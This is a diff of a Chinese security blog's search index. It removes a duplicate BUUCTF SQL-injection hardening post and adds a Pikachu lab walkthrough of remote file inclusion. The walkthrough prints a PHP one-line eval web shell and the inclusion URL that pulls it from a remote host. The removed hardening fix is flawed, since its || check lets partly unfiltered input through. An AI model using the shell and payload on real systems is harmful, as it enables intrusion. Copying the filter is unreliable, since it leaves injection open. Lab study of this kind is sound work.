@@ -15572,70 +15572,6 @@ xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code><
       </tags>
   </entry>
   <entry>
-    <title>BUUCTF：加固题</title>
-    <url>/2022/01/01/buuctf-jia-gu-ti/buuctf-jia-gu-ti/</url>
-    <content><![CDATA[<h1 id="Ezsql"><a href="#Ezsql" class="headerlink" title="Ezsql"></a>Ezsql</h1><p><img src="/2022/01/01/buuctf-jia-gu-ti/buuctf-jia-gu-ti/image-20220101145336353.png" alt="image-20220101145336353"></p>
-<p>用mobaXterm/XFTP之类的去链接服务器</p>
-<p><img src="/2022/01/01/buuctf-jia-gu-ti/buuctf-jia-gu-ti/image-20220101145501821.png" alt="image-20220101145501821"></p>
-<p>备份var/www/html下的文件</p>
-<p>index.php关键代码：</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span> <span class="token string">'dbConnect.php'</span><span class="token punctuation">;</span>
-<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username = '$username' AND password = '$password'"</span><span class="token punctuation">;</span>
-    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span>
-        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 从结果集中获取所有数据</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token keyword">echo</span> <span class="token string">'登录成功！'</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
-        <span class="token keyword">echo</span> <span class="token string">"用户名或密码错误"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
-<span class="token delimiter">?></span></code></pre>
-<p>在vscode中修改拉进去（因为编码问题）</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span> <span class="token string">'dbConnect.php'</span><span class="token punctuation">;</span>
-<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token variable">$r</span><span class="token operator">=</span><span class="token string">"/  \~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\)|\)|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\  /i"</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">||</span> 
-       <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username = '$username' AND password = '$password'"</span><span class="token punctuation">;</span>
-        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span>
-            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 从结果集中获取所有数据</span>
-
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-            <span class="token keyword">echo</span> <span class="token string">'登录成功！'</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
-            <span class="token keyword">echo</span> <span class="token string">"用户名或密码错误"</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span>
-    <span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">'输入不正确！'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
-
-
-<span class="token punctuation">}</span>
-<span class="token delimiter">?></span></code></pre>
-<p>通过preg_match过滤</p>
-<pre class=" language-php"><code class="language-php"><span class="token string">"/  \~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\)|\)|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\  /i"</span></code></pre>
-<p>ctrl+s</p>
-<p>访问check服务器</p>
-<p><img src="/2022/01/01/buuctf-jia-gu-ti/buuctf-jia-gu-ti/image-20220101150037932.png" alt="image-20220101150037932"></p>
-<p><img src="/2022/01/01/buuctf-jia-gu-ti/buuctf-jia-gu-ti/image-20220101150320173.png" alt="image-20220101150320173"></p>
-]]></content>
-  </entry>
-  <entry>
     <title>BUUCTF加固题：Ezsql</title>
     <url>/2022/01/01/buuctf-jia-gu-ti/buuctf-jia-gu-ti-ezsql/</url>
     <content><![CDATA[<p><img src="/BUUCTF%E5%8A%A0%E5%9B%BA%E9%A2%98%EF%BC%9AEzsql.assets/image-20220101145336353.png" alt="image-20220101145336353"></p>
@@ -15697,6 +15633,32 @@ xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code><
 <p>访问check服务器</p>
 <p><img src="/BUUCTF%E5%8A%A0%E5%9B%BA%E9%A2%98%EF%BC%9AEzsql.assets/image-20220101150037932.png" alt="image-20220101150037932"></p>
 <p><img src="/BUUCTF%E5%8A%A0%E5%9B%BA%E9%A2%98%EF%BC%9AEzsql.assets/image-20220101150320173.png" alt="image-20220101150320173"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Pikachu：远程文件包含写入木马</title>
+    <url>/2022/01/03/pikachu/pikachu-yuan-cheng-wen-jian-bao-han-xie-ru-mu-ma/</url>
+    <content><![CDATA[<p>用kali做远程主机</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string">'&lt;?php @eval($_POST["shell"]);?>'</span><span class="token punctuation">;</span>
+    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>写入var/www/html/phpinfo.txt</p>
+<p>这段php可以生成shell.php并写入🐎</p>
+<p>启动apache服务</p>
+<pre class=" language-bash"><code class="language-bash">systemctl start apache2.service
+systemctl status apache2.service
+<span class="token function">ifconfig</span></code></pre>
+<p><img src="/2022/01/03/pikachu/pikachu-yuan-cheng-wen-jian-bao-han-xie-ru-mu-ma/1.png" alt="1"></p>
+<p>访问一下试试</p>
+<p><img src="/2022/01/03/pikachu/pikachu-yuan-cheng-wen-jian-bao-han-xie-ru-mu-ma/b.png" alt="b"></p>
+<pre class=" language-http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=http://xxx.xx.xx.xx/phpinfo.txt&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</code></pre>
+<p>看到已经写入shell.php</p>
+<p><img src="/2022/01/03/pikachu/pikachu-yuan-cheng-wen-jian-bao-han-xie-ru-mu-ma/c.png" alt="c"></p>
+<p>蚁剑连接，非常离谱<img src="/2022/01/03/pikachu/pikachu-yuan-cheng-wen-jian-bao-han-xie-ru-mu-ma/d.png" alt="d"></p>
+<p><img src="/2022/01/03/pikachu/pikachu-yuan-cheng-wen-jian-bao-han-xie-ru-mu-ma/e.png" alt="e"></p>
 ]]></content>
   </entry>
 </search>
